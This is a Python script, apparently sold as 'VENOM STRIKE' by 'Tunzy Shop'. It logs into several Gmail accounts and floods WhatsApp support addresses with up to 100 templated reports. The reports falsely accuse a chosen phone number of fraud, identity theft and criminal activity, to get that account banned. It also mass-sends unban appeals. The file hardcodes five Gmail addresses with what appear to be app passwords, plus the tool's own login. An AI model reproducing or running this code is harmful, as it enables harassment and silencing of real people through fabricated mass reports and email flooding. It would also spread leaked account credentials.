import smtplib
import getpass
import time
import re
import os
import random
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from colorama import Fore, Style, init

init(autoreset=True)

# ===== Authentication =====
tool_username = "tunzy"
tool_password = "tunzyban"

# ===== Gmail Accounts =====
gmail_accounts = [
    {"email": "bematunmi444@gmail.com", "password": "siqlebxrpvqugxsy", "status": "active"},
    {"email": "zorosales6@gmail.com", "password": "ltvtpaduohtlsykx", "status": "active"},
    {"email": "okunlolatunmise12@gmail.com", "password": "otvmwdhxvmxbqglf", "status": "active"},
    {"email": "mbb657504@gmail.com", "password": "hkun wznn jsfe eltc", "status": "active"},
    {"email": "riderstuff61@gmail.com", "password": "hjaormoydmyaveas", "status": "active"},
]

# ===== WhatsApp Support Emails =====
SUPPORT_EMAILS = [
    "support@support.whatsapp.com",
    "appeals@support.whatsapp.com",
    "abuse@support.whatsapp.com",
    "security@support.whatsapp.com",
    "businesscomplaints@support.whatsapp.com",
]

# ===== Settings =====
REPORTS_PER_EMAIL = 20
TOTAL_REPORTS = 100
EMAILS_NEEDED = TOTAL_REPORTS // REPORTS_PER_EMAIL

# ===== Utility Functions =====
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    print(Fore.GREEN + """
    ╔══════════════════════════════╗
    ║         VENOM STRIKE         ║
    ║   WhatsApp Control System    ║
    ║                              ║
    ║        ▄▄▄▄▄▄▄▄▄▄▄▄          ║
    ║        █░░░░░░░░░█          ║
    ║        █░░▄▀▀▀▄░░█          ║
    ║        █░░█░░░█░░█          ║
    ║        █░░▀▄▄▄▀░░█          ║
    ║        █░░░░░░░░░█          ║
    ║        █░░█▀▀▀█░░█          ║
    ║        █░░█░░░█░░█          ║
    ║        ▀▀▀▀░░░▀▀▀▀          ║
    ║                              ║
    ║        BY TUNZY SHOP         ║
    ╚══════════════════════════════╝
    """)

def validate_phone(phone):
    return bool(re.match(r'^\+\d{10,15}$', phone))

# ===== Email Templates =====
def get_ban_template(phone, ban_type):
    if ban_type == "temporary":
        subject = f"URGENT: Temporary Ban Required - {phone}"
        body = f"""
IMMEDIATE ACTION REQUIRED - ACCOUNT {phone}

This account is actively engaged in serious violations:
• Financial fraud operations
• Impersonation of official accounts
• Harassment and threats
• Multiple scam reports confirmed
• Platform terms violations

Evidence available:
- Screenshots of fraudulent activities
- Victim testimony and complaints
- Transaction records
- Multiple independent reports

Request: Please implement a temporary 30-day suspension immediately.
"""
    else:
        subject = f"CRITICAL: Permanent Ban Required - {phone}"
        body = f"""
MAXIMUM URGENCY - PERMANENT ACTION REQUIRED - ACCOUNT {phone}

This is a confirmed serial offender:
• Organized criminal network
• Identity theft activities
• Multiple severe violations
• Law enforcement coordination

Request: Permanent termination of account {phone}.
"""
    return subject, body

def get_unban_template(phone, ban_type):
    if ban_type == "temporary":
        subject = f"Account Review Request - {phone}"
        body = f"""
FORMAL APPEAL: TEMPORARY BAN REVERSAL

Account: {phone}
Issue: Wrongful temporary suspension

I believe my account was suspended in error:
1. Automated system false positive
2. Mass false reporting
3. Technical error
4. Identity confusion

Request: Please review and lift the suspension.
"""
    else:
        subject = f"Legal Appeal: Permanent Ban Reversal - {phone}"
        body = f"""
LEGAL DEMAND: PERMANENT BAN REVERSAL

Account: {phone}
Issue: Wrongful permanent termination

This account has been permanently banned due to error:
1. Identity theft
2. System failure
3. Fabricated evidence
4. Due process failure

DEMAND: Full account restoration.
"""
    return subject, body

# ===== Email Sending System =====
class EmailBomber:
    def __init__(self):
        self.total_sent = 0
    
    def send_email(self, account, to_email, subject, body):
        try:
            msg = MIMEMultipart()
            msg['From'] = account["email"]
            msg['To'] = to_email
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))
            
            server = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
            server.ehlo()
            server.starttls()
            server.login(account["email"], account["password"])
            server.send_message(msg)
            server.quit()
            
            return True
        except:
            return False
    
    def launch_attack(self, phone, operation_type, ban_type=None):
        clear()
        print_banner()
        
        if operation_type == "ban":
            print(Fore.GREEN + f"\n✅ SENDING REQUEST TO BAN {phone}\n")
            subject, body = get_ban_template(phone, ban_type)
        else:
            print(Fore.GREEN + f"\n✅ SENDING REQUEST TO UNBAN {phone}\n")
            subject, body = get_unban_template(phone, ban_type)
        
        # Select emails to use
        if operation_type == "ban" and ban_type == "temporary":
            emails_to_use = gmail_accounts[:EMAILS_NEEDED]
        else:
            emails_to_use = gmail_accounts[:5]
        
        # Send reports
        report_count = 0
        
        for account in emails_to_use:
            for report_num in range(REPORTS_PER_EMAIL):
                for target_email in SUPPORT_EMAILS:
                    success = self.send_email(account, target_email, subject, body)
                    
                    if success:
                        self.total_sent += 1
                        report_count += 1
                        
                        if operation_type == "ban":
                            print(Fore.GREEN + f"   ✓ Report sent ({self.total_sent}/{TOTAL_REPORTS})")
                        else:
                            print(Fore.BLUE + f"   ✓ Appeal sent ({self.total_sent}/{TOTAL_REPORTS})")
                    
                    # Check if we've sent enough
                    if self.total_sent >= TOTAL_REPORTS:
                        print(Fore.CYAN + "\n" + "─" * 40)
                        if operation_type == "ban":
                            print(Fore.GREEN + f"✅ BAN REQUEST COMPLETE")
                        else:
                            print(Fore.GREEN + f"✅ UNBAN REQUEST COMPLETE")
                        print(Fore.YELLOW + f"📊 Total sent: {self.total_sent}")
                        print(Fore.CYAN + "─" * 40)
                        return True
                    
                    time.sleep(0.05)
        
        print(Fore.CYAN + "\n" + "─" * 40)
        if operation_type == "ban":
            print(Fore.GREEN + f"✅ BAN REQUEST COMPLETE")
        else:
            print(Fore.GREEN + f"✅ UNBAN REQUEST COMPLETE")
        print(Fore.YELLOW + f"📊 Total sent: {self.total_sent}")
        print(Fore.CYAN + "─" * 40)
        
        return True

# ===== Login System =====
def login():
    clear()
    print_banner()
    
    attempts = 0
    while attempts < 3:
        print(Fore.CYAN + "\n" + "─" * 30)
        print(Fore.YELLOW + "🔐 SYSTEM LOGIN")
        print(Fore.CYAN + "─" * 30)
        
        user = input(Fore.CYAN + "\nUsername: ").strip()
        pwd = getpass.getpass(Fore.CYAN + "Password: ")
        
        if user == tool_username and pwd == tool_password:
            print(Fore.GREEN + "\n✅ Login successful!")
            time.sleep(1)
            return True
        else:
            attempts += 1
            print(Fore.RED + f"\n❌ Access denied ({attempts}/3)")
            time.sleep(1)
            clear()
            print_banner()
    
    print(Fore.RED + "\n🚫 Maximum attempts reached")
    exit()

# ===== Main Menu =====
def main_menu():
    bomber = EmailBomber()
    
    while True:
        clear()
        print_banner()
        
        print(Fore.CYAN + "\n" + "─" * 30)
        print(Fore.YELLOW + "🎯 CONTROL PANEL")
        print(Fore.CYAN + "─" * 30)
        
        print(Fore.GREEN + "\n1. BAN TEMPORARY")
        print(Fore.GREEN + "2. BAN PERMANENT")
        print(Fore.GREEN + "3. UNBAN TEMPORARY")
        print(Fore.GREEN + "4. UNBAN PERMANENT")
        print(Fore.RED + "0. EXIT")
        
        print(Fore.CYAN + "─" * 30)
        
        choice = input(Fore.YELLOW + "\nSelect: ").strip()
        
        if choice == "1":
            handle_operation(bomber, "ban", "temporary")
        elif choice == "2":
            handle_operation(bomber, "ban", "permanent")
        elif choice == "3":
            handle_operation(bomber, "unban", "temporary")
        elif choice == "4":
            handle_operation(bomber, "unban", "permanent")
        elif choice == "0":
            print(Fore.YELLOW + "\n👋 Exiting...")
            break
        else:
            print(Fore.RED + "\n❌ Invalid!")
            time.sleep(1)

def handle_operation(bomber, operation_type, ban_type):
    clear()
    print_banner()
    
    if operation_type == "ban":
        print(Fore.CYAN + "\n" + "─" * 30)
        print(Fore.YELLOW + f"🚫 {ban_type.upper()} BAN")
        print(Fore.CYAN + "─" * 30)
    else:
        print(Fore.CYAN + "\n" + "─" * 30)
        print(Fore.YELLOW + f"✅ {ban_type.upper()} UNBAN")
        print(Fore.CYAN + "─" * 30)
    
    phone = input(Fore.YELLOW + f"\nEnter number: ").strip()
    
    if not validate_phone(phone):
        print(Fore.RED + "\n❌ Invalid number!")
        time.sleep(2)
        return
    
    if operation_type == "ban":
        confirm = input(Fore.RED + f"\nConfirm {ban_type} ban? (y/n): ").lower()
    else:
        confirm = input(Fore.GREEN + f"\nConfirm {ban_type} unban? (y/n): ").lower()
    
    if confirm != 'y':
        print(Fore.YELLOW + "\n❌ Cancelled")
        time.sleep(1)
        return
    
    bomber.launch_attack(phone, operation_type, ban_type)
    
    if operation_type == "ban":
        print(Fore.GREEN + f"\n✅ {ban_type.upper()} ban completed!")
    else:
        print(Fore.GREEN + f"\n✅ {ban_type.upper()} unban completed!")
    
    input(Fore.CYAN + "\nPress Enter to continue...")

# ===== Main Program =====
if __name__ == "__main__":
    try:
        if login():
            main_menu()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n\n👋 Program stopped")
    except Exception as e:
        print(Fore.RED + f"\n⚠️  Error")
    finally:
        print(Fore.CYAN + "\n" + "─" * 30)
        print(Fore.YELLOW + "VENOM STRIKE")
        print(Fore.GREEN + "BY TUNZY SHOP")
        print(Fore.CYAN + "─" * 30)